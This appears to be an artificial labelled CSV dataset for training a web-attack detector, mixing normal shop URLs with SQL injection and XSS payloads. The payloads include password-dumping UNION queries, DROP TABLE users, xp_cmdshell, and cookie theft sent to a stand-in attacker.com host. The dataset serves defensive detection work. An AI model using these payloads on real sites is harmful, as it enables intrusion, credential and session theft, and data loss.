text,label,threat_type
laptop,0,NORMAL
browse?tag=index.html,0,NORMAL
blog/post-10-cybersecurity-tips,0,NORMAL
redirect=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
filter?category=reviews?rating=5&verified=true&sort=desc,0,NORMAL
comment=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
search?q=1' AND SLEEP(10)--,1,SQL_INJECTION
filter?category=password123!&sort=desc,0,NORMAL
search?q=gaming+monitor,0,NORMAL
' OR 1=1 --,1,SQL_INJECTION
query=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
<svg/onload=alert('XSS')>,2,XSS
<img src=x onerror=alert('XSS')>,2,XSS
<script>alert(1)</script>,2,XSS
api/search?term=usb+c+cable+2m,0,NORMAL
'; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
search?q=view_order?order_id=983214,0,NORMAL
comment=<svg/onload=alert('XSS')>,2,XSS
) or ('1'='1,1,SQL_INJECTION
' or 1=1/*,1,SQL_INJECTION
item/help/return-policy?ref=homepage,0,NORMAL
settings?theme=dark&lang=en,0,NORMAL
search?q=<select autofocus onfocus=alert(1)>,2,XSS
gaming monitor,0,NORMAL
search?q=<body onload=alert('XSS')>,2,XSS
item?id=' OR 'a'='a,1,SQL_INJECTION
query=<input autofocus onfocus=alert(1)>,2,XSS
query=home&page=1,0,NORMAL
order/status?tracking=FEDEX-889922,0,NORMAL
search?q=download/specs-datasheet.pdf,0,NORMAL
about-us,0,NORMAL
filter?category=download/specs-datasheet.pdf&sort=desc,0,NORMAL
search?q=%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
api/search?term=products/audio/bluetooth-speakers,0,NORMAL
browse?tag=mechanical+keyboard,0,NORMAL
%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
dashboard?view=summary,0,NORMAL
item/home?ref=homepage,0,NORMAL
"query=<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
product?id=102&category=electronics,0,NORMAL
item?id=' or 1=1#,1,SQL_INJECTION
query='><script>alert('PWNED')</script>,2,XSS
<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
admin' #,1,SQL_INJECTION
download/specs-datasheet.pdf,0,NORMAL
search?q=' OR 'a'='a,1,SQL_INJECTION
assets/css/main.css,0,NORMAL
profile/edit?name=Johnathan,0,NORMAL
"search?q=<video><source onerror=""javascript:alert(1)"">",2,XSS
comment=<script>alert(1)</script>,2,XSS
"comment=<video><source onerror=""javascript:alert(1)"">",2,XSS
<script>alert('XSS')</script>,2,XSS
item?id=' OR '1'='1,1,SQL_INJECTION
filter=1' ORDER BY 2--+,1,SQL_INJECTION
browse?tag=account/security/2fa-setup,0,NORMAL
<input autofocus onfocus=alert(1)>,2,XSS
login?user=' or 1=1#,1,SQL_INJECTION
query=admin_user_2024&page=1,0,NORMAL
item/alice.smith@example.com?ref=homepage,0,NORMAL
'><script>alert('PWNED')</script>,2,XSS
<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
"<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
download/specs-datasheet.pdf,0,NORMAL
<script>alert(1)</script>,2,XSS
browse?tag=terms-and-conditions,0,NORMAL
filter?category=images/banner-sale.jpg&sort=desc,0,NORMAL
login?user=1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
1' ORDER BY 3--+,1,SQL_INJECTION
"<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
"redirect=""><script>alert(document.domain)</script>",2,XSS
<script>alert(1)</script>,2,XSS
"<object data=""javascript:alert(1)"">",2,XSS
search?q=<body onload=alert('XSS')>,2,XSS
search?q=apple+macbook+pro+m2,0,NORMAL
query=best+headphones+under+100&page=1,0,NORMAL
filter?category=laptop&sort=desc,0,NORMAL
"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
api/search?term=search?q=mechanical+pencil+0.5mm,0,NORMAL
item?id=admin'/*,1,SQL_INJECTION
api/search?term=download/specs-datasheet.pdf,0,NORMAL
<isindex type=image src=1 onerror=alert(1)>,2,XSS
browse?tag=home,0,NORMAL
download/specs-datasheet.pdf,0,NORMAL
cart/add?item_id=554&qty=1,0,NORMAL
item?id=' or 1=1#,1,SQL_INJECTION
api/search?term=index.html,0,NORMAL
login?user='; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
filter='; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
comment='><script>alert('PWNED')</script>,2,XSS
search?q=spring+sale+discount,0,NORMAL
query=shoes+for+running&page=1,0,NORMAL
products/audio/bluetooth-speakers,0,NORMAL
browse?tag=mechanical+keyboard,0,NORMAL
login?user=admin' --,1,SQL_INJECTION
terms-and-conditions,0,NORMAL
filter?category=index.html&sort=desc,0,NORMAL
1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
' OR '1'='1,1,SQL_INJECTION
api/search?term=apple+macbook+pro+m2,0,NORMAL
<select autofocus onfocus=alert(1)>,2,XSS
<marquee onstart=alert(1)>,2,XSS
item?id=1' ORDER BY 3--+,1,SQL_INJECTION
search?q=products/audio/bluetooth-speakers,0,NORMAL
api/search?term=gaming+monitor,0,NORMAL
<details open ontoggle=alert(1)>,2,XSS
newsletter/subscribe?email=user@test.org,0,NORMAL
search?q=spring+sale+discount,0,NORMAL
password123!,0,NORMAL
home,0,NORMAL
query=view_order?order_id=983214&page=1,0,NORMAL
search?q=' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
"<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
<isindex type=image src=1 onerror=alert(1)>,2,XSS
contact,0,NORMAL
login?user=) or ('1'='1,1,SQL_INJECTION
search?q='; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
1' ORDER BY 2--+,1,SQL_INJECTION
redirect=<isindex type=image src=1 onerror=alert(1)>,2,XSS
redirect=<body onload=alert('XSS')>,2,XSS
query=order/status?tracking=FEDEX-889922&page=1,0,NORMAL
filter=admin' #,1,SQL_INJECTION
comment='><script>alert('PWNED')</script>,2,XSS
filter?category=view_order?order_id=983214&sort=desc,0,NORMAL
search?q=admin'/*,1,SQL_INJECTION
%27%20OR%201%3D1%20--,1,SQL_INJECTION
'><script>alert('PWNED')</script>,2,XSS
products/audio/bluetooth-speakers,0,NORMAL
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
search?q=' OR '1'='1,1,SQL_INJECTION
"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
browse?tag=order/status?tracking=FEDEX-889922,0,NORMAL
"<video><source onerror=""javascript:alert(1)"">",2,XSS
<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
"test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
best headphones under 100,0,NORMAL
filter?category=view_order?order_id=983214&sort=desc,0,NORMAL
<input autofocus onfocus=alert(1)>,2,XSS
apple macbook pro m2,0,NORMAL
admin'/*,1,SQL_INJECTION
"item?id=test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
filter=' OR '1'='1,1,SQL_INJECTION
<select autofocus onfocus=alert(1)>,2,XSS
"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
comment=<script>alert('XSS')</script>,2,XSS
browse?tag=search?q=mechanical+pencil+0.5mm,0,NORMAL
assets/js/bundle.min.js,0,NORMAL
help/return-policy,0,NORMAL
filter?category=reviews?rating=5&verified=true&sort=desc,0,NORMAL
<svg/onload=alert('XSS')>,2,XSS
checkout?shipping=standard&promo=WELCOME10,0,NORMAL
home,0,NORMAL
login?user=admin'/*,1,SQL_INJECTION
browse?tag=products/audio/bluetooth-speakers,0,NORMAL
newsletter/subscribe?email=user@test.org,0,NORMAL
item/cart/add?item_id=554&qty=1?ref=homepage,0,NORMAL
item/dashboard?view=summary?ref=homepage,0,NORMAL
<svg/onload=alert('XSS')>,2,XSS
contact,0,NORMAL
assets/css/main.css,0,NORMAL
api/v1/users?limit=10&offset=20,0,NORMAL
account/security/2fa-setup,0,NORMAL
api/search?term=john_doe,0,NORMAL
filter?category=download/specs-datasheet.pdf&sort=desc,0,NORMAL
' OR 1=1 --,1,SQL_INJECTION
assets/css/main.css,0,NORMAL
"redirect=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
"comment=<object data=""javascript:alert(1)"">",2,XSS
<body onload=alert('XSS')>,2,XSS
comment=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
filter=1' ORDER BY 3--+,1,SQL_INJECTION
login?user=') or ('1'='1'--,1,SQL_INJECTION
search?q=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
item/contact?ref=homepage,0,NORMAL
search?q=' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
product?id=102&category=electronics,0,NORMAL
filter?category=images/banner-sale.jpg&sort=desc,0,NORMAL
1; DROP TABLE users--,1,SQL_INJECTION
catalog?page=2&sort=price_asc,0,NORMAL
blog/post-10-cybersecurity-tips,0,NORMAL
browse?tag=help/return-policy,0,NORMAL
comment='><script>alert('PWNED')</script>,2,XSS
"filter=' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
query=apple+macbook+pro+m2&page=1,0,NORMAL
query=<details open ontoggle=alert(1)>,2,XSS
filter?category=assets/js/bundle.min.js&sort=desc,0,NORMAL
item/settings?theme=dark&lang=en?ref=homepage,0,NORMAL
api/search?term=cotton+t-shirt+blue,0,NORMAL
admin' #,1,SQL_INJECTION
1; DROP TABLE users--,1,SQL_INJECTION
' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
redirect=<isindex type=image src=1 onerror=alert(1)>,2,XSS
comment=<svg onload=alert(1)>,2,XSS
dashboard?view=summary,0,NORMAL
' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
%27%20OR%201%3D1%20--,1,SQL_INJECTION
search?q=mechanical+pencil+0.5mm,0,NORMAL
blog/post-10-cybersecurity-tips,0,NORMAL
view_order?order_id=983214,0,NORMAL
redirect=<script>alert('XSS')</script>,2,XSS
"' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
api/search?term=index.html,0,NORMAL
comment=<script>alert('XSS')</script>,2,XSS
"test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
"search?q=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
wireless mouse,0,NORMAL
query=python+programming+book&page=1,0,NORMAL
<script>alert(1)</script>,2,XSS
' or 1=1/*,1,SQL_INJECTION
api/search?term=assets/css/main.css,0,NORMAL
download/specs-datasheet.pdf,0,NORMAL
account/security/2fa-setup,0,NORMAL
account/security/2fa-setup,0,NORMAL
%27%20OR%201%3D1%20--,1,SQL_INJECTION
item/order/status?tracking=FEDEX-889922?ref=homepage,0,NORMAL
catalog?page=2&sort=price_asc,0,NORMAL
<img src=x onerror=alert('XSS')>,2,XSS
"query=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
item/usb+c+cable+2m?ref=homepage,0,NORMAL
reviews?rating=5&verified=true,0,NORMAL
"test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
search?q=cart/checkout?step=billing,0,NORMAL
search?q=admin' --,1,SQL_INJECTION
SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
best headphones under 100,0,NORMAL
settings?theme=dark&lang=en,0,NORMAL
browse?tag=product?id=102&category=electronics,0,NORMAL
item/terms-and-conditions?ref=homepage,0,NORMAL
"search?q=<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
password123!,0,NORMAL
<input autofocus onfocus=alert(1)>,2,XSS
admin' #,1,SQL_INJECTION
<img src=x onerror=alert('XSS')>,2,XSS
item/settings?theme=dark&lang=en?ref=homepage,0,NORMAL
view_order?order_id=983214,0,NORMAL
filter?category=settings?theme=dark&lang=en&sort=desc,0,NORMAL
search?q=%27%20OR%201%3D1%20--,1,SQL_INJECTION
search?q=contact,0,NORMAL
best headphones under 100,0,NORMAL
search?q=<input autofocus onfocus=alert(1)>,2,XSS
filter?category=apple+macbook+pro+m2&sort=desc,0,NORMAL
comment=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
browse?tag=order/status?tracking=FEDEX-889922,0,NORMAL
search?q=<script>alert(1)</script>,2,XSS
search?q=gaming+monitor,0,NORMAL
privacy-policy,0,NORMAL
checkout?shipping=standard&promo=WELCOME10,0,NORMAL
search?q=python+programming+book,0,NORMAL
query=laptop&page=1,0,NORMAL
filter?category=products/audio/bluetooth-speakers&sort=desc,0,NORMAL
1' ORDER BY 3--+,1,SQL_INJECTION
1' ORDER BY 1--+,1,SQL_INJECTION
admin_user_2024,0,NORMAL
api/search?term=john_doe,0,NORMAL
order/status?tracking=FEDEX-889922,0,NORMAL
item/account/security/2fa-setup?ref=homepage,0,NORMAL
api/search?term=images/banner-sale.jpg,0,NORMAL
"item?id="" OR ""1""=""1",1,SQL_INJECTION
api/v1/users?limit=10&offset=20,0,NORMAL
query=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
query=shoes+for+running&page=1,0,NORMAL
query=terms-and-conditions&page=1,0,NORMAL
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
api/search?term=cotton+t-shirt+blue,0,NORMAL
browse?tag=gaming+monitor,0,NORMAL
' OR '1'='1,1,SQL_INJECTION
cart/add?item_id=554&qty=1,0,NORMAL
assets/js/bundle.min.js,0,NORMAL
api/search?term=faq/shipping-times,0,NORMAL
'; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
api/search?term=usb+c+cable+2m,0,NORMAL
api/search?term=settings?theme=dark&lang=en,0,NORMAL
<svg onload=alert(1)>,2,XSS
terms-and-conditions,0,NORMAL
1' ORDER BY 1--+,1,SQL_INJECTION
item?id=1' ORDER BY 1--+,1,SQL_INJECTION
john_doe,0,NORMAL
search?q=1' AND SLEEP(10)--,1,SQL_INJECTION
"<video><source onerror=""javascript:alert(1)"">",2,XSS
account/security/2fa-setup,0,NORMAL
<svg/onload=alert('XSS')>,2,XSS
cart/checkout?step=billing,0,NORMAL
browse?tag=product?id=102&category=electronics,0,NORMAL
search?q=ergonomic+chair+mesh,0,NORMAL
search?q=shoes+for+running,0,NORMAL
api/search?term=usb+c+cable+2m,0,NORMAL
admin' --,1,SQL_INJECTION
settings?theme=dark&lang=en,0,NORMAL
' OR '1'='1,1,SQL_INJECTION
contact,0,NORMAL
' or 1=1#,1,SQL_INJECTION
api/search?term=reviews?rating=5&verified=true,0,NORMAL
query=assets/css/main.css&page=1,0,NORMAL
search?q=terms-and-conditions,0,NORMAL
apple macbook pro m2,0,NORMAL
api/search?term=catalog?page=2&sort=price_asc,0,NORMAL
SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
"query=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
best headphones under 100,0,NORMAL
search?q=settings?theme=dark&lang=en,0,NORMAL
usb c cable 2m,0,NORMAL
"redirect=<a href=""javascript:alert('XSS')"">Click here</a>",2,XSS
search?q=4k+oled+television+lg,0,NORMAL
SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
item/search?q=ergonomic+chair+mesh?ref=homepage,0,NORMAL
about-us,0,NORMAL
search?q=<svg onload=alert(1)>,2,XSS
browse?tag=contact,0,NORMAL
filter?category=terms-and-conditions&sort=desc,0,NORMAL
comment=<img src=x onerror=alert('XSS')>,2,XSS
filter?category=search?q=spring+sale+discount&sort=desc,0,NORMAL
') or ('1'='1'--,1,SQL_INJECTION
usb c cable 2m,0,NORMAL
"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
search?q=blog/post-10-cybersecurity-tips,0,NORMAL
redirect=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
<select autofocus onfocus=alert(1)>,2,XSS
search?q='><script>alert('PWNED')</script>,2,XSS
alice.smith@example.com,0,NORMAL
browse?tag=best+headphones+under+100,0,NORMAL
search?q=<script>alert('XSS')</script>,2,XSS
<details open ontoggle=alert(1)>,2,XSS
search?q=<select autofocus onfocus=alert(1)>,2,XSS
filter?category=shoes+for+running&sort=desc,0,NORMAL
' OR '1'='1,1,SQL_INJECTION
help/return-policy,0,NORMAL
"redirect=""><script>alert(document.domain)</script>",2,XSS
login?user=' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
<details open ontoggle=alert(1)>,2,XSS
<select autofocus onfocus=alert(1)>,2,XSS
api/search?term=view_order?order_id=983214,0,NORMAL
browse?tag=profile/edit?name=Johnathan,0,NORMAL
query=download/specs-datasheet.pdf&page=1,0,NORMAL
item/faq/shipping-times?ref=homepage,0,NORMAL
1' ORDER BY 3--+,1,SQL_INJECTION
admin' #,1,SQL_INJECTION
1' ORDER BY 1--+,1,SQL_INJECTION
alice.smith@example.com,0,NORMAL
"' UNION SELECT username, password FROM users--",1,SQL_INJECTION
' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
browse?tag=search?q=ergonomic+chair+mesh,0,NORMAL
<script>alert(1)</script>,2,XSS
api/search?term=search?q=spring+sale+discount,0,NORMAL
search?q=<script>alert('XSS')</script>,2,XSS
api/search?term=cart/add?item_id=554&qty=1,0,NORMAL
"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
search?q=wireless+mouse,0,NORMAL
' or 1=1#,1,SQL_INJECTION
item/index.html?ref=homepage,0,NORMAL
"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
cart/add?item_id=554&qty=1,0,NORMAL
item?id=1' ORDER BY 3--+,1,SQL_INJECTION
api/search?term=account/security/2fa-setup,0,NORMAL
cart/checkout?step=billing,0,NORMAL
laptop,0,NORMAL
"search?q=<script src=""http://attacker.com/malicious.js""></script>",2,XSS
profile/edit?name=Johnathan,0,NORMAL
api/search?term=search?q=ergonomic+chair+mesh,0,NORMAL
query=index.html&page=1,0,NORMAL
api/search?term=apple+macbook+pro+m2,0,NORMAL
filter?category=best+headphones+under+100&sort=desc,0,NORMAL
"search?q=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
api/search?term=checkout?shipping=standard&promo=WELCOME10,0,NORMAL
comment=<svg onload=alert(1)>,2,XSS
item/products/audio/bluetooth-speakers?ref=homepage,0,NORMAL
browse?tag=products/audio/bluetooth-speakers,0,NORMAL
password123!,0,NORMAL
' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
browse?tag=password123!,0,NORMAL
assets/css/main.css,0,NORMAL
' or 1=1/*,1,SQL_INJECTION
catalog?page=2&sort=price_asc,0,NORMAL
help/return-policy,0,NORMAL
admin' --,1,SQL_INJECTION
"login?user=1' UNION SELECT null, null, null--",1,SQL_INJECTION
<select autofocus onfocus=alert(1)>,2,XSS
admin' --,1,SQL_INJECTION
api/search?term=help/return-policy,0,NORMAL
catalog?page=2&sort=price_asc,0,NORMAL
item?id=1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
query=cart/add?item_id=554&qty=1&page=1,0,NORMAL
search?q=1' ORDER BY 3--+,1,SQL_INJECTION
search?q=admin'/*,1,SQL_INJECTION
item?id=' or 1=1#,1,SQL_INJECTION
filter=admin' #,1,SQL_INJECTION
account/security/2fa-setup,0,NORMAL
browse?tag=search?q=spring+sale+discount,0,NORMAL
"""><script>alert(document.domain)</script>",2,XSS
1' ORDER BY 1--+,1,SQL_INJECTION
"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
) or ('1'='1,1,SQL_INJECTION
search?q=apple+macbook+pro+m2,0,NORMAL
alice.smith@example.com,0,NORMAL
search?q=mechanical+pencil+0.5mm,0,NORMAL
best headphones under 100,0,NORMAL
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
query=mechanical+keyboard&page=1,0,NORMAL
item/account/security/2fa-setup?ref=homepage,0,NORMAL
query=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
"query=<script src=""http://attacker.com/malicious.js""></script>",2,XSS
laptop,0,NORMAL
faq/shipping-times,0,NORMAL
1' AND SLEEP(10)--,1,SQL_INJECTION
1' AND SLEEP(10)--,1,SQL_INJECTION
"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
"search?q=<object data=""javascript:alert(1)"">",2,XSS
admin'/*,1,SQL_INJECTION
search?q=images/banner-sale.jpg,0,NORMAL
api/search?term=search?q=ergonomic+chair+mesh,0,NORMAL
admin'/*,1,SQL_INJECTION
filter?category=api/v1/users?limit=10&offset=20&sort=desc,0,NORMAL
item?id=' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
filter?category=apple+macbook+pro+m2&sort=desc,0,NORMAL
"<object data=""javascript:alert(1)"">",2,XSS
item?id=1; DROP TABLE users--,1,SQL_INJECTION
filter=1' AND SLEEP(10)--,1,SQL_INJECTION
filter=1' AND SLEEP(10)--,1,SQL_INJECTION
item/newsletter/subscribe?email=user@test.org?ref=homepage,0,NORMAL
1' ORDER BY 1--+,1,SQL_INJECTION
search?q=alice.smith@example.com,0,NORMAL
query=shoes+for+running&page=1,0,NORMAL
filter=' or 1=1#,1,SQL_INJECTION
filter?category=contact&sort=desc,0,NORMAL
query=index.html&page=1,0,NORMAL
query=catalog?page=2&sort=price_asc&page=1,0,NORMAL
search?q=assets/css/main.css,0,NORMAL
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
"<object data=""javascript:alert(1)"">",2,XSS
"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
search?q=' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
login?user=SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
') or ('1'='1'--,1,SQL_INJECTION
item?id=' HAVING 1=1 --,1,SQL_INJECTION
filter=' OR 'a'='a,1,SQL_INJECTION
redirect=<script>alert(1)</script>,2,XSS
search?q=product?id=102&category=electronics,0,NORMAL
contact,0,NORMAL
reviews?rating=5&verified=true,0,NORMAL
api/search?term=reviews?rating=5&verified=true,0,NORMAL
<details open ontoggle=alert(1)>,2,XSS
"filter=1' UNION SELECT null, null, null--",1,SQL_INJECTION
search?q=<svg onload=alert(1)>,2,XSS
api/search?term=faq/shipping-times,0,NORMAL
query=contact&page=1,0,NORMAL
filter=') or ('1'='1'--,1,SQL_INJECTION
apple macbook pro m2,0,NORMAL
%27%20OR%201%3D1%20--,1,SQL_INJECTION
gaming monitor,0,NORMAL
products/audio/bluetooth-speakers,0,NORMAL
filter=' OR 1=1 --,1,SQL_INJECTION
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
"search?q=""><script>alert(document.domain)</script>",2,XSS
redirect=<details open ontoggle=alert(1)>,2,XSS
product?id=102&category=electronics,0,NORMAL
admin' #,1,SQL_INJECTION
api/search?term=search?q=spring+sale+discount,0,NORMAL
mechanical keyboard,0,NORMAL
query=images/banner-sale.jpg&page=1,0,NORMAL
"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
item?id=%27%20OR%201%3D1%20--,1,SQL_INJECTION
browse?tag=settings?theme=dark&lang=en,0,NORMAL
query=terms-and-conditions&page=1,0,NORMAL
login?user=' or 1=1#,1,SQL_INJECTION
' HAVING 1=1 --,1,SQL_INJECTION
query=<input autofocus onfocus=alert(1)>,2,XSS
1' ORDER BY 3--+,1,SQL_INJECTION
item/cart/add?item_id=554&qty=1?ref=homepage,0,NORMAL
laptop,0,NORMAL
item/profile/edit?name=Johnathan?ref=homepage,0,NORMAL
browse?tag=python+programming+book,0,NORMAL
api/search?term=home,0,NORMAL
search?q=api/v1/users?limit=10&offset=20,0,NORMAL
search?q=admin'/*,1,SQL_INJECTION
cotton t-shirt blue,0,NORMAL
search?q=cotton+t-shirt+blue,0,NORMAL
search?q=<svg onload=alert(1)>,2,XSS
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
"<object data=""javascript:alert(1)"">",2,XSS
"' UNION SELECT username, password FROM users--",1,SQL_INJECTION
filter?category=dashboard?view=summary&sort=desc,0,NORMAL
login?user=' OR 1=1 --,1,SQL_INJECTION
browse?tag=checkout?shipping=standard&promo=WELCOME10,0,NORMAL
"<a href=""javascript:alert('XSS')"">Click here</a>",2,XSS
browse?tag=assets/js/bundle.min.js,0,NORMAL
1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
contact,0,NORMAL
dashboard?view=summary,0,NORMAL
"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
' or 1=1#,1,SQL_INJECTION
filter=' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
search?q=1' AND 1=(SELECT COUNT(*) FROM tabname); --,1,SQL_INJECTION
1; DROP TABLE users--,1,SQL_INJECTION
search?q=assets/css/main.css,0,NORMAL
redirect=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
query=assets/js/bundle.min.js&page=1,0,NORMAL
query=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
about-us,0,NORMAL
search?q=4k+oled+television+lg,0,NORMAL
search?q=search?q=mechanical+pencil+0.5mm,0,NORMAL
search?q=admin_user_2024,0,NORMAL
terms-and-conditions,0,NORMAL
assets/js/bundle.min.js,0,NORMAL
<script>alert(1)</script>,2,XSS
settings?theme=dark&lang=en,0,NORMAL
filter=' or 1=1#,1,SQL_INJECTION
query=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
api/search?term=assets/css/main.css,0,NORMAL
"""><script>alert(document.domain)</script>",2,XSS
download/specs-datasheet.pdf,0,NORMAL
query=settings?theme=dark&lang=en&page=1,0,NORMAL
redirect=<input autofocus onfocus=alert(1)>,2,XSS
mechanical keyboard,0,NORMAL
item/python+programming+book?ref=homepage,0,NORMAL
' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
item/blog/post-10-cybersecurity-tips?ref=homepage,0,NORMAL
<img src=x onerror=alert('XSS')>,2,XSS
